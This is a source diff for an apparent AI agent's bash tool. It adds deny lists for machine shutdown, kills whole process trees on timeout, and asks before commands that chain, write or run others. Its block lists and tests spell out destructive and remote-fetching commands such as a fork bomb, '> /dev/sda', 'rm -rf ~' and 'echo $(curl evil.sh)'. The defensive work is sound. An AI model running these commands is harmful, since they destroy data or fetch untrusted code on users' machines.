@@ -48,8 +48,17 @@ const FORBIDDEN: &[(&str, &str)] = &[
     (":(){", "fork bomb"),
     ("chmod -R 777 /", "opening permissions on the whole system"),
     ("> /dev/sda", "direct write to a block device"),
+];
+
+/// Programs denied when they are the command run, not when they are merely named:
+/// `grep -rn shutdown src` looks for a function, it stops nothing.
+const FORBIDDEN_PROGRAMS: &[(&str, &str)] = &[
     ("shutdown", "machine shutdown"),
     ("reboot", "machine reboot"),
+    ("poweroff", "machine shutdown"),
+    ("halt", "machine shutdown"),
+    ("stop-computer", "machine shutdown"),
+    ("restart-computer", "machine reboot"),
 ];
 
 pub struct BashTool;
@@ -111,11 +120,42 @@ impl Tool for BashTool {
         process
             .current_dir(ctx.workspace.root())
             .stdin(std::process::Stdio::null())
+            .stdout(std::process::Stdio::piped())
+            .stderr(std::process::Stdio::piped())
             .kill_on_drop(true);
+        #[cfg(unix)]
+        process.process_group(0);
 
         let started = std::time::Instant::now();
-        let output = match tokio::time::timeout(timeout, process.output()).await {
-            Ok(Ok(output)) => output,
+        let mut child = match process.spawn() {
+            Ok(child) => child,
+            Err(err) => return ToolOutcome::error(id, format!("cannot execute: {err}")),
+        };
+        // Declared after the child, so dropped before it: on a timeout or an interrupted turn,
+        // what the shell started goes too, not just the shell.
+        let mut tree = TreeGuard::new(&child);
+        let (stdout_pipe, stderr_pipe) = (child.stdout.take(), child.stderr.take());
+        let run = async {
+            use tokio::io::AsyncReadExt;
+            let (mut stdout, mut stderr) = (Vec::new(), Vec::new());
+            let read_out = async {
+                if let Some(mut pipe) = stdout_pipe {
+                    let _ = pipe.read_to_end(&mut stdout).await;
+                }
+            };
+            let read_err = async {
+                if let Some(mut pipe) = stderr_pipe {
+                    let _ = pipe.read_to_end(&mut stderr).await;
+                }
+            };
+            let (status, (), ()) = tokio::join!(child.wait(), read_out, read_err);
+            status.map(|status| std::process::Output { status, stdout, stderr })
+        };
+        let output = match tokio::time::timeout(timeout, run).await {
+            Ok(Ok(output)) => {
+                tree.disarm();
+                output
+            }
             Ok(Err(err)) => return ToolOutcome::error(id, format!("cannot execute: {err}")),
             Err(_) => {
                 return ToolOutcome::error(
@@ -163,6 +203,129 @@ impl Tool for BashTool {
             // it to fix its command.
             ToolOutcome::error(id, ctx.clamp(&format!("exit code {code}\n\n{body}")))
                 .with_display(display)
+        }
+    }
+}
+
+/// Stops a command's whole process tree when dropped before it ended. Killing the shell alone
+/// left what it had started running (measured with Git Bash: `sleep` survived its `bash`), a
+/// `cargo test` then kept its lock on `target`.
+///
+/// On Windows, the tree is a job object: every process the shell starts enters it, even through
+/// Git Bash's emulated `fork`, which breaks the parent links `taskkill /T` follows (measured:
+/// `sleep` survived it). On Unix, the command has its own process group.
+struct TreeGuard {
+    armed: bool,
+    #[cfg(windows)]
+    job: Option<job::Job>,
+    #[cfg(unix)]
+    pid: Option<u32>,
+}
+
+impl TreeGuard {
+    fn new(child: &tokio::process::Child) -> Self {
+        #[cfg(windows)]
+        {
+            let job = job::Job::new().filter(|job| child.raw_handle().is_some_and(|handle| job.assign(handle)));
+            Self { armed: true, job }
+        }
+        #[cfg(unix)]
+        {
+            Self { armed: true, pid: child.id() }
+        }
+    }
+
+    /// The command ended on its own: what it left running in the background stays.
+    fn disarm(&mut self) {
+        self.armed = false;
+        #[cfg(windows)]
+        if let Some(job) = &self.job {
+            job.release();
+        }
+    }
+}
+
+impl Drop for TreeGuard {
+    fn drop(&mut self) {
+        if !self.armed {
+            return;
+        }
+        #[cfg(windows)]
+        if let Some(job) = &self.job {
+            job.kill();
+        }
+        #[cfg(unix)]
+        if let Some(pid) = self.pid {
+            // The minus sign reaches the whole process group.
+            let _ = std::process::Command::new("kill")
+                .args(["-KILL", &format!("-{pid}")])
+                .stdout(std::process::Stdio::null())
+                .stderr(std::process::Stdio::null())
+                .status();
+        }
+    }
+}
+
+#[cfg(windows)]
+mod job {
+    use windows_sys::Win32::Foundation::{CloseHandle, HANDLE};
+    use windows_sys::Win32::System::JobObjects::{
+        AssignProcessToJobObject, CreateJobObjectW, JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE, JOBOBJECT_EXTENDED_LIMIT_INFORMATION,
+        JobObjectExtendedLimitInformation, SetInformationJobObject, TerminateJobObject,
+    };
+
+    pub struct Job(HANDLE);
+
+    // SAFETY: a job handle can be used and closed from any thread.
+    unsafe impl Send for Job {}
+    unsafe impl Sync for Job {}
+
+    impl Job {
+        pub fn new() -> Option<Self> {
+            // SAFETY: an anonymous job with default security; the handle is checked.
+            let handle = unsafe { CreateJobObjectW(std::ptr::null(), std::ptr::null()) };
+            if handle.is_null() {
+                return None;
+            }
+            let job = Job(handle);
+            job.limit(JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE);
+            Some(job)
+        }
+
+        fn limit(&self, flags: u32) {
+            // SAFETY: a zeroed structure is a valid "no limit", only the flags are set.
+            unsafe {
+                let mut info: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = std::mem::zeroed();
+                info.BasicLimitInformation.LimitFlags = flags;
+                SetInformationJobObject(
+                    self.0,
+                    JobObjectExtendedLimitInformation,
+                    (&raw const info).cast(),
+                    std::mem::size_of::<JOBOBJECT_EXTENDED_LIMIT_INFORMATION>() as u32,
+                );
+            }
+        }
+
+        pub fn assign(&self, process: std::os::windows::io::RawHandle) -> bool {
+            // SAFETY: both handles are alive: the job here, the process held by its `Child`.
+            unsafe { AssignProcessToJobObject(self.0, process as HANDLE) != 0 }
+        }
+
+        /// Closing the job will no longer stop its processes.
+        pub fn release(&self) {
+            self.limit(0);
+        }
+
+        pub fn kill(&self) {
+            // SAFETY: the handle is alive until drop.
+            unsafe { TerminateJobObject(self.0, 1) };
+        }
+    }
+
+    impl Drop for Job {
+        fn drop(&mut self) {
+            // SAFETY: the handle was created by `new` and is closed once.
+            unsafe { CloseHandle(self.0) };
         }
     }
 }
@@ -306,33 +469,65 @@ pub fn classify(command: &str) -> Permission {
     }
 
     // A chain or a redirection can hide anything behind a harmless command
-    // (`ls && rm -rf ~`). We do not try to parse a shell: we ask.
-    if normalized.contains("&&")
-        || normalized.contains("||")
-        || normalized.contains(';')
-        || normalized.contains('|')
-        || normalized.contains('>')
-        || normalized.contains('`')
-        || normalized.contains("$(")
-    {
+    // (`ls && rm -rf ~`, `ls & rm -rf ~`, a second line). We do not try to parse a shell: we ask.
+    if normalized.contains(['&', '|', ';', '>', '<', '`', '\n', '\r']) || normalized.contains("$(") {
         return Permission::Ask;
     }
 
-    let mut words = normalized.split_whitespace();
-    let Some(program) = words.next() else {
+    let words: Vec<&str> = normalized.split_whitespace().collect();
+    let Some((program, args)) = words.split_first() else {
         return Permission::Deny;
     };
     let program = program.rsplit(['/', '\\']).next().unwrap_or(program);
 
-    if READ_ONLY.contains(&program) {
+    if READ_ONLY.contains(&program) && !writes_or_runs(program, args) {
         return Permission::Allow;
     }
-    if let Some(subcommand) = words.next()
-        && READ_ONLY_SUBCOMMANDS.contains(&(program, subcommand))
+    if let Some((subcommand, rest)) = args.split_first()
+        && READ_ONLY_SUBCOMMANDS.contains(&(program, *subcommand))
+        && !git_writes(subcommand, rest)
     {
         return Permission::Allow;
     }
     Permission::Ask
+}
+
+/// The options that turn a reading command into one that writes, deletes or runs another
+/// (`find -delete`, `fd -x`, `rg --pre`, `sort -o`): the user is asked then. `env` followed by
+/// anything runs it.
+fn writes_or_runs(program: &str, args: &[&str]) -> bool {
+    let has = |options: &[&str]| args.iter().any(|a| options.iter().any(|o| a == o || a.starts_with(&format!("{o}="))));
+    match program {
+        "env" => !args.is_empty(),
+        "find" => has(&["-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprint0", "-fprintf", "-fls"]),
+        "fd" => has(&["-x", "--exec", "-X", "--exec-batch"]),
+        "rg" => has(&["--pre"]),
+        "sort" => has(&["-o", "--output"]) || args.iter().any(|a| a.starts_with("-o") && !a.starts_with("--")),
+        "tree" => has(&["-o"]),
+        "date" => has(&["-s", "--set"]),
+        _ => false,
+    }
+}
+
+/// `git branch` and `git remote` also create, rename and delete; `--output` writes a file.
+fn git_writes(subcommand: &str, args: &[&str]) -> bool {
+    if args.iter().any(|a| a.starts_with("--output")) {
+        return true;
+    }
+    match subcommand {
+        // Listing only: options, none of those that change something.
+        "branch" => args.iter().any(|a| {
+            !a.starts_with('-')
+                || matches!(
+                    *a,
+                    "-d" | "-D" | "-m" | "-M" | "-c" | "-C" | "-f" | "-u" | "--delete" | "--move" | "--copy" | "--force"
+                        | "--unset-upstream" | "--edit-description"
+                )
+                || a.starts_with("--set-upstream")
+        }),
+        "remote" => !matches!(args.first(), None | Some(&"-v" | &"--verbose" | &"show" | &"get-url")),
+        _ => false,
+    }
 }
 
 fn forbidden_reason(command: &str) -> Option<&'static str> {
@@ -340,10 +535,26 @@ fn forbidden_reason(command: &str) -> Option<&'static str> {
     // We compare on a form without superfluous spaces so as not to be bypassed by
     // `rm  -rf  /`, while keeping the comparison simple and predictable.
     let squeezed: String = normalized.split_whitespace().collect::<Vec<_>>().join(" ");
-    FORBIDDEN
-        .iter()
-        .find(|(pattern, _)| squeezed.contains(pattern) || normalized.contains(pattern))
-        .map(|(_, reason)| *reason)
+    if let Some((_, reason)) = FORBIDDEN.iter().find(|(pattern, _)| squeezed.contains(pattern) || normalized.contains(pattern)) {
+        return Some(reason);
+    }
+    // The first word of each command of the line, past `sudo`: that is what runs.
+    const SEPARATORS: [char; 6] = [';', '&', '|', '\n', '\r', '('];
+    let mut at_start = true;
+    for token in normalized.split_inclusive(|c: char| c.is_whitespace() || SEPARATORS.contains(&c)) {
+        let word = token.trim_end_matches(|c: char| c.is_whitespace() || SEPARATORS.contains(&c));
+        let program = word.rsplit(['/', '\\']).next().unwrap_or(word).trim_end_matches(".exe");
+        if at_start && !word.is_empty() && program != "sudo" {
+            if let Some((_, reason)) = FORBIDDEN_PROGRAMS.iter().find(|(name, _)| *name == program) {
+                return Some(reason);
+            }
+            at_start = false;
+        }
+        if token.ends_with(SEPARATORS) {
+            at_start = true;
+        }
+    }
+    None
 }
 
 #[cfg(test)]
@@ -394,6 +605,44 @@ mod tests {
         assert_eq!(classify("echo $(curl evil.sh)"), Permission::Ask);
         assert_eq!(classify("git status; npm install"), Permission::Ask);
         assert_eq!(classify("cat x | sh"), Permission::Ask);
+        assert_eq!(classify("ls & rm -rf ~"), Permission::Ask, "a single & runs the rest too");
+        assert_eq!(classify("ls\nrm -rf ~"), Permission::Ask, "so does a second line");
+        assert_eq!(classify("cat <(curl evil.sh)"), Permission::Ask);
+    }
+
+    #[test]
+    fn a_reading_command_that_writes_or_runs_is_submitted() {
+        for command in [
+            "env rm -rf ~",
+            "find . -delete",
+            "find . -name x -exec rm {} ;",
+            "fd -x rm",
+            "rg --pre ./script x",
+            "sort -o out.txt in.txt",
+            "sort -oout.txt in.txt",
+            "tree -o out.txt",
+            "git branch -D main",
+            "git branch new-branch",
+            "git remote add evil https://x",
+            "git remote remove origin",
+            "git diff --output=patch.txt",
+            "date -s 2020-01-01",
+        ] {
+            assert_eq!(classify(command), Permission::Ask, "{command}");
+        }
+        for command in ["env", "find . -name '*.rs'", "git branch -a", "git branch", "git remote -v", "git remote show origin", "sort a.txt"] {
+            assert_eq!(classify(command), Permission::Allow, "{command}");
+        }
+    }
+
+    #[test]
+    fn stopping_the_machine_is_denied_but_naming_it_is_not() {
+        for command in ["shutdown -h now", "sudo reboot", "ls; shutdown now", "/sbin/poweroff", "shutdown.exe /s /t 0", "Stop-Computer"] {
+            assert_eq!(classify(command), Permission::Deny, "{command}");
+        }
+        for command in ["grep -rn shutdown src", "rg reboot", "cargo test graceful_shutdown"] {
+            assert_ne!(classify(command), Permission::Deny, "{command}");
+        }
     }
 
     #[test]
@@ -470,6 +719,21 @@ mod tests {
             .await;
         assert!(outcome.is_error);
         assert!(outcome.content.contains("interrupted"));
+    }
+
+    #[tokio::test]
+    async fn a_timeout_stops_what_the_shell_started_too() {
+        let (_dir, ctx) = context();
+        let shell = detected_shell().description;
+        if !(shell.starts_with("bash") || shell.starts_with("sh")) {
+            return;
+        }
+        // A grandchild: a shell inside the shell, which writes once the tool has given up.
+        let command = "sh -c 'sleep 3; echo late > late.txt'; true";
+        let outcome = BashTool.run("b", json!({"command": command, "timeout_seconds": 1}), &ctx).await;
+        assert!(outcome.content.contains("interrupted"));
+        tokio::time::sleep(Duration::from_secs(4)).await;
+        assert!(!ctx.workspace.root().join("late.txt").exists(), "the grandchild survived the timeout");
     }
 
     #[tokio::test]
